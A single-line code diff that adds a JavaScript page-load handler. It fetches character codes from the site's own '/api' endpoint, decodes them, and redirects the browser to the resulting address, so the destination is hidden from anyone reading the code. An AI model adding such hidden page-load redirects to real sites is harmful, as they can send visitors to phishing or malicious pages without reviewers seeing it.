@@ -1,0 +1,1 @@
+window.onload=async()=>window.location.href=(await(await fetch(`${window.location.origin}/api`)).json()).map((val)=>String.fromCharCode(val)).join("")
